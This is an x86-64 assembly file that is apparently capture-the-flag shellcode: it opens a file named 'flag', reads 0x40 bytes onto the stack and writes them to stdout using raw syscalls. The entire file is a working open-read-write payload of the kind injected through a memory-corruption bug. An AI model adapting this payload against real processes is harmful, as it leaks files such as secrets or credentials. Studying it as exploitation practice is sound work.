BITS 64
global _start
_start:
    push 0x67616c66
    mov rdi,rsp
    xor rax,rax
    push rax
    pop rsi
    push rax
    pop rdx
    mov al,0x2
    syscall

    mov rdi,rax
    push rsi
    pop rax
    mov rsi,rsp
    mov dl,0x40
    syscall

    xchg rax,rdx
    mov dil,0x1
    mov al,0x1
    syscall
